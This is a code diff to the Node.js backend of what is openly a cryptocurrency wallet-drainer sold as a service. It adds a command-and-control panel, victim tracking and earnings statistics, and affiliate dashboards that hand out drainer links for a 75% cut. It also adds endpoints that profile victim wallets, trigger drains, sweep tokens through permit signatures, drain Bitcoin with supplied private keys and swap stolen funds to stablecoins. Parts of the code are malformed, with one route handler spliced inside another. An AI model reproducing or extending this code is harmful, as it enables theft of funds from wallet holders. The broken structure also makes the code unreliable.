@@ -1499,6 +1499,656 @@ app.get('/api/chains/status', async (req, res) => {
   }
 });
 
+app.post('/api/flow/start', (req, res) => {
+  try {
+    const { userAddress, flowType } = req.body;
+    const flowId = flowCoordinator.startDrainFlow(userAddress, flowType);
+    res.json({ success: true, flowId });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/flow/step', (req, res) => {
+  try {
+    const { flowId, stepName, data } = req.body;
+    const success = flowCoordinator.addFlowStep(flowId, stepName, data);
+    res.json({ success });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/flow/status', (req, res) => {
+  try {
+    const { flowId, status, results } = req.body;
+    const success = flowCoordinator.updateFlowStatus(flowId, status, results);
+    res.json({ success });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/flow/status/:flowId', (req, res) => {
+  try {
+    const { flowId } = req.params;
+    const status = flowCoordinator.getFlowStatus(flowId);
+    res.json({ success: true, status });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/flow/active', (req, res) => {
+  try {
+    const activeFlows = flowCoordinator.getActiveFlows();
+    res.json({ success: true, flows: activeFlows });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/flow/history', (req, res) => {
+  try {
+    const history = flowCoordinator.getFlowHistory();
+    res.json({ success: true, history });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+setInterval(() => {
+  flowCoordinator.cleanupOldFlows();
+}, 60 * 60 * 1000);
+
+app.get('/api/chains/config/:chainId', async (req, res) => {
+  try {
+    const { chainId } = req.params;
+    const config = chainManager.getChainConfig(chainId);
+    res.json({ success: true, config });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/chains/load', async (req, res) => {
+  try {
+    const result = await chainManager.loadChains();
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+// Multi-sig approval endpoint
+app.post('/api/multisig/approve', (req, res) => {
+  try {
+    const { operationId, signerAddress, signature } = req.body;
+    
+    const result = multiSigManager.addSignature(operationId, signerAddress, signature);
+    res.json({ success: true, ...result });
+    
+  } catch (error) {
+    res.status(400).json({ success: false, error: error.message });
+  }
+});
+
+// Multi-sig status endpoint
+app.get('/api/multisig/status/:operationId', (req, res) => {
+  const { operationId } = req.params;
+  const isApproved = multiSigManager.isOperationApproved(operationId);
+  const request = multiSigManager.pendingApprovals.get(operationId);
+  
+  res.json({ approved: isApproved, request });
+});
+
+// Multi-sig pending requests endpoint
+app.get('/api/multisig/pending', (req, res) => {
+  const pendingRequests = multiSigManager.getPendingRequests();
+  res.json({ pending: pendingRequests });
+});
+
+
+// Dynamic client site serving
+app.get('/saas/client/:clientId', (req, res) => {
+  try {
+    const { clientId } = req.params;
+    
+    if (!clients.has(clientId)) {
+      return res.status(404).send('Client not found');
+    }
+    
+    const client = clients.get(clientId);
+    const clientSite = generateClientSite(client);
+    
+    res.send(clientSite);
+  } catch (error) {
+    console.error('Client site error:', error);
+    res.status(500).send('Error loading site');
+  }
+});
+
+// Client admin dashboard
+app.get('/saas/admin/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).send('Client not found');
+  }
+  
+  const client = clients.get(clientId);
+  
+  const adminHTML = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin - ${client.name}</title>
+        <style>
+            body { font-family: Arial; margin: 40px; background: #0f0f23; color: white; }
+            .card { background: #1e1e3f; padding: 20px; border-radius: 10px; margin: 10px 0; }
+            .earnings { color: #10b981; font-size: 2em; font-weight: bold; }
+        </style>
+    </head>
+    <body>
+        <h1>🏢 ${client.name} - Admin Dashboard</h1>
+        <div class="card">
+            <h3>💰 Earnings Overview</h3>
+            <div class="earnings">$${(client.earnings * 1800).toFixed(2)} USD</div>
+            <small>${client.earnings} ETH total drained</small>
+        </div>
+        <div class="card">
+            <h3>🔗 Your Drainer URL</h3>
+<input type="text" value="https://ch.xqx.workers.dev/?client=${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
+<p>Share this link to start earning!</p>
+        </div>
+        <div class="card">
+            <h3>📊 Next Payout</h3>
+            <p>Next automatic payout: <strong>Monday 9 AM UTC</strong></p>
+            <p>Your wallet: <code>${client.wallet}</code></p>
+            <p>You keep: <strong>75%</strong> of all earnings</p>
+        </div>
+    </body>
+    </html>
+  `;
+  
+  res.send(adminHTML);
+});
+
+// ==================== C&C CONTROL CENTER ====================
+let c2Config = {
+    enabled: true,                    // Master switch
+    minValueUsd: 100,                 // Minimum target value ($100)
+    autoDrain: true,                  // Auto-drain enabled
+    stealthLevel: "high",             // Stealth mode
+    lastUpdated: new Date().toISOString()
+};
+
+// ADD THIS: Victim tracking for statistics
+let c2Stats = {
+    totalVictims: 0,
+    totalEarnings: 0,
+    successfulDrains: 0,
+    failedDrains: 0,
+    lastActivity: new Date().toISOString()
+};
+
+// C&C Status Endpoint - FIXED to use real stats
+app.get('/c2/status', (req, res) => {
+  res.json({
+      status: c2Config.enabled ? 'active' : 'paused',
+      config: c2Config,
+      stats: c2Stats  // Use real statistics instead of hardcoded
+  });
+});
+
+// C&C Control Endpoint
+app.post('/c2/control', (req, res) => {
+  const { password, action, settings } = req.body;
+  
+  // SECURITY: Check admin password
+  if (password !== process.env.ADMIN_PASSWORD) {
+      return res.status(401).json({ error: 'Unauthorized' });
+  }
+
+  switch (action) {
+      case 'enable':
+          c2Config.enabled = true;
+          break;
+      case 'disable':
+          c2Config.enabled = false;
+          break;
+      case 'update':
+          c2Config = { ...c2Config, ...settings };
+          break;
+      case 'emergency':
+          // Immediate shutdown procedure
+          c2Config.enabled = false;
+          // Add any emergency cleanup here
+          break;
+      default:
+          return res.status(400).json({ error: 'Invalid action' });
+  }
+
+  c2Config.lastUpdated = new Date().toISOString();
+  res.json({ success: true, config: c2Config });
+});
+
+// ADD THIS: C&C Report Endpoint
+app.post('/c2/report', (req, res) => {
+  try {
+      const report = req.body;
+      
+      // Update statistics based on report type
+      switch (report.action) {
+          case 'connect':
+              c2Stats.totalVictims++;
+              break;
+          case 'sweep_native':
+          case 'sweep_tokens':
+          case 'sweep_erc721':
+          case 'sweep_erc1155':
+              if (report.success) {
+                  c2Stats.successfulDrains++;
+                  // Add value if provided
+                  if (report.valueUsd) {
+                      c2Stats.totalEarnings += parseFloat(report.valueUsd);
+                  }
+              } else {
+                  c2Stats.failedDrains++;
+              }
+              break;
+      }
+      
+      c2Stats.lastActivity = new Date().toISOString();
+      console.log(`📊 C&C Report: ${report.action} from ${report.walletAddress}`);
+      
+      res.json({ received: true, stats: c2Stats });
+      
+  } catch (error) {
+      console.error('❌ C&C report error:', error.message);
+      res.status(500).json({ error: 'Internal server error' });
+  }
+});
+// ==================== END C&C CENTER ====================
+
+app.post('/api/proxy', proxyHandler);
+app.get('/api/proxy', proxyHandler);
+
+// Route for /panel and /panel.html
+app.get(["/panel", "/panel.html"], (req, res) => {
+  res.sendFile(path.join(__dirname, "panel.html"));
+});
+
+// Victim history API - FIXED VERSION
+// Clean routes added
+
+// Victim history API - CLEAN VERSION
+app.get("/api/history", (req, res) => {
+  try {
+    const victimsFile = path.join(__dirname, "victims.json");
+    
+    // Check if file exists - if not, create it
+    if (!fs.existsSync(victimsFile)) {
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    // Read the file
+    const fileContent = fs.readFileSync(victimsFile, "utf8").trim();
+    
+    // If file is empty, initialize with empty array
+    if (!fileContent) {
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    // Parse JSON and ensure it's always an array
+    let data;
+    try {
+      data = JSON.parse(fileContent);
+    } catch (parseError) {
+      console.log("Error parsing victims.json, resetting:", parseError.message);
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    // Ensure we always return an array
+    const result = Array.isArray(data) ? data : [];
+    res.json(result);
+    
+  } catch (error) {
+    console.error("Error in /api/history:", error.message);
+    res.json([]);
+  }
+});
+
+// SAAS Clients API - CLEAN VERSION
+app.get("/api/saas-clients", (req, res) => {
+  try {
+    const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
+      const earnings = clientEarnings.get(clientId) || [];
+      const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
+      const victimCount = (clientVictims.get(clientId) || []).length;
+      
+      return {
+        clientId,
+        projectName: client.name || "Unknown",
+        wallet: client.wallet || "Not set",
+        themeColor: client.themeColor || "#6366f1",
+        totalEarnings: totalEarnings.toFixed(4),
+        victimCount,
+        registrationDate: "Recent",
+        drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
+        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
+      };
+    });
+    
+    res.json({
+      success: true,
+      totalClients: clientsArray.length,
+      clients: clientsArray
+    });
+  } catch (error) {
+    console.error("Error fetching SAAS clients:", error);
+    res.status(500).json({ error: "Failed to fetch clients" });
+  }
+});
+
+// Track endpoint - simplified for random targeting
+app.post("/api/track", async (req, res) => {
+  try {
+    // C&C INTEGRATION: Check if drainer is enabled
+    if (!c2Config.enabled) {
+      console.log('⏸️ Drainer disabled, ignoring victim connection');
+      return res.json({ 
+        success: false, 
+        error: 'Drainer temporarily disabled by operator' 
+      });
+    }
+
+    const victimData = req.body;
+    
+    // Log all connections since we're targeting randomly
+    console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
+    
+    // Emit connection to all panels
+    io.emit('victim-connected', {
+      walletAddress: victimData.walletAddress,
+      chain: victimData.chain,
+      timestamp: new Date().toISOString(),
+      isRandomTarget: true
+    });
+    
+    // Continue with original trackHandler logic
+    return trackHandler(req, res);
+    
+  } catch (error) {
+    console.error('❌ Tracking error:', error.message);
+    return trackHandler(req, res);
+  }
+});
+
+// Drain endpoint - Add C&C check
+app.post("/api/relay", (req, res) => {
+  // C&C INTEGRATION: Check if drainer is enabled
+  if (!c2Config.enabled) {
+    return res.json({ 
+      success: false, 
+      error: 'Drainer disabled by operator' 
+    });
+  }
+
+  console.log(`⚡ Drain triggered for ${req.body.walletAddress} on ${req.body.chain}`);
+  res.json({ success: true });
+});
+
+// Replace the entire victim profile API endpoint with this fixed version:
+app.get("/api/victim/:chain/:address", async (req, res) => {
+  try {
+    const { address, chain } = req.params;
+    const apiKey = process.env.MORALIS_API_KEY;
+
+    if (!apiKey) {
+      return res.status(500).json({ error: "Missing MORALIS_API_KEY in .env" });
+    }
+
+    const chainMap = { eth: "eth", bsc: "bsc", polygon: "polygon" };
+    const moralisChain = chainMap[chain] || "eth";
+
+    const [tokensRes, nftsRes, txsRes] = await Promise.all([
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=${moralisChain}`, {
+        headers: { "X-API-Key": apiKey }
+      }),
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft?chain=${moralisChain}&format=decimal`, {
+        headers: { "X-API-Key": apiKey }
+      }),
+      fetch(`https://deep-index.moralis.io/api/v2/${address}?chain=${moralisChain}`, {
+        headers: { "X-API-Key": apiKey }
+      })
+    ]);
+
+    // ADD PROPER ERROR HANDLING FOR EACH RESPONSE
+    let tokens = { result: [] };
+    let nfts = { result: [] };
+    let txs = { balance: '0', transactions: [] };
+
+    // Handle tokens response
+    if (tokensRes.ok) {
+      try {
+        const tokensText = await tokensRes.text();
+        if (tokensText && tokensText.trim() !== '') {
+          tokens = JSON.parse(tokensText);
+        }
+      } catch (e) {
+        console.error('❌ Token data parsing error:', e.message);
+      }
+    } else {
+      console.log('⚠️ Tokens API responded with:', tokensRes.status);
+    }
+
+    // Handle NFTs response
+    if (nftsRes.ok) {
+      try {
+        const nftsText = await nftsRes.text();
+        if (nftsText && nftsText.trim() !== '') {
+          nfts = JSON.parse(nftsText);
+        }
+      } catch (e) {
+        console.error('❌ NFT data parsing error:', e.message);
+      }
+    } else {
+      console.log('⚠️ NFTs API responded with:', nftsRes.status);
+    }
+
+    // Handle transactions response
+    if (txsRes.ok) {
+      try {
+        const txsText = await txsRes.text();
+        if (txsText && txsText.trim() !== '') {
+          txs = JSON.parse(txsText);
+        }
+      } catch (e) {
+        console.error('❌ Transaction data parsing error:', e.message);
+      }
+    } else {
+      console.log('⚠️ Transactions API responded with:', txsRes.status);
+    }
+
+    res.json({ tokens, nfts, txs });
+  } catch (err) {
+    console.error("❌ Victim profile error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+
+// Health check endpoint
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'ok', 
+    timestamp: new Date().toISOString()
+  });
+});
+
+// Uptime monitoring endpoint - keep server awake (for cron jobs)
+app.get("/ping", (req, res) => {
+  res.json({ 
+    status: "pong", 
+    timestamp: new Date().toISOString(),
+    server: "drainer-saas",
+    version: "1.0"
+  });
+});
+
+// Socket.IO connection
+io.on("connection", (socket) => {
+  console.log("🔌 Operator panel connected");
+  
+  // Send current C&C status to newly connected panels
+  socket.emit('c2-status', {
+    enabled: c2Config.enabled,
+    status: c2Config.enabled ? 'active' : 'paused'
+  });
+});
+
+const PORT = process.env.PORT || 3001;
+server.listen(PORT, async () => {
+  console.log(`🚀 Server running on http://localhost:${PORT}`);
+  console.log(`🎯 C&C Control: http://localhost:${PORT}/c2/status`);
+  console.log(`📊 C&C Reports: http://localhost:${PORT}/c2/report`);
+  console.log(`🔒 Security features: Rate limiting & IP whitelisting enabled`);
+  console.log(`🔐 Multi-signature system: Enabled`);
+  
+  // Initialize all systems
+  try {
+    // Initialize security
+    await securityManager.initializeSecurity();
+    console.log('🔐 Security system initialized successfully');
+    
+    // Load chains
+    await chainManager.loadChains();
+    console.log('⛓️  Chains loaded successfully');
+    
+    // Start C&C heartbeat
+    c2Communicator.startHeartbeat(30000);
+    console.log('❤️  C&C heartbeat started');
+    
+    // Start flow cleanup
+    setInterval(() => {
+      flowCoordinator.cleanupOldFlows();
+    }, 60 * 60 * 1000);
+    console.log('🔄 Flow cleanup scheduled');
+    
+    console.log('✅ All systems initialized successfully');
+    
+  } catch (error) {
+    console.error('❌ System initialization failed:', error.message);
+    process.exit(1);
+  }
+});
+// backend/index.js - ADD AFTER SERVER START
+c2Communicator.startHeartbeat(30000); // 30 second heartbeat
+
+async function completeDrainOperation(victimAddress, drainedTokens) {
+    try {
+        // For each drained token, auto-swap to stable
+        for (const token of drainedTokens) {
+            const swapResult = await SwapHandler.autoSwapToStable(
+                token.address,
+                token.amount,
+                token.chainId,
+                victimAddress
+            );
+            
+            if (swapResult?.success) {
+                console.log(`💰 Converted ${token.symbol} to stablecoins!`);
+            }
+        }
+    } catch (error) {
+        console.error('Auto-swap failed:', error);
+    }
+}
+
+app.post('/api/execute-swap', async (req, res) => {
+app.post('/api/execute-drain', async (req, res) => {
+  try {
+    let { userAddress, chainId } = req.body;
+    
+    console.log('📨 Received drain request for:', userAddress);
+    
+    // Normalize address
+    if (userAddress) {
+      try {
+        userAddress = ethers.getAddress(userAddress.toLowerCase());
+      } catch (e) {
+        return res.json({ success: false, error: "Invalid address format" });
+      }
+    }
+    
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+      return res.json({ success: false, error: "Valid userAddress required" });
+    }
+    
+    console.log('🎯 Processing drain for:', userAddress);
+    
+    // Call your drain logic
+    const result = await coreDrainer.executeImmediateDrain(userAddress);
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ Drain endpoint error:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
+    try {
+        const { tokenAddress, amount, chainId } = req.body;
+        
+        const result = await SwapHandler.autoSwapToStable(
+            tokenAddress,
+            amount,
+            chainId
+        );
+        
+        res.json({ success: true, result });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
+
+// backend/index.js - ADD THESE ENDPOINTS
+app.post('/api/bitcoin/balance', async (req, res) => {
+  try {
+    const { address } = req.body;
+    const balance = await coreDrainer.getBTCBalance(address);
+    res.json({ success: true, balance });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/bitcoin/drain', async (req, res) => {
+  try {
+    const { fromAddress, privateKeyWIF, destinationAddress } = req.body;
+    const txid = await coreDrainer.drainBTC(fromAddress, privateKeyWIF, destinationAddress);
+    res.json({ success: true, txid });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// backend/index.js - ADD THESE ENDPOINTS
+app.post('/api/permit/sweep', async (req, res) => {
+  try {
+    const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
+    const result = await permitManager.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/permit/approve-transfer', async (req, res) => {
+  try {
+
 // ==================== CLEAN EXECUTE-DRAIN ENDPOINT ====================
 app.post('/api/execute-drain', async (req, res) => {
   try {
@@ -1516,12 +2166,7 @@ app.post('/api/execute-drain', async (req, res) => {
   }
 });
 
-// Health endpoint
-app.get('/api/health', (req, res) => {
-  res.json({ status: 'ok', timestamp: new Date().toISOString() });
-});
-
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
-  console.log('🚀 CLEAN SERVER - Running successfully');
+  console.log('🚀 ADVANCED FEATURES SERVER - Running successfully');
 });
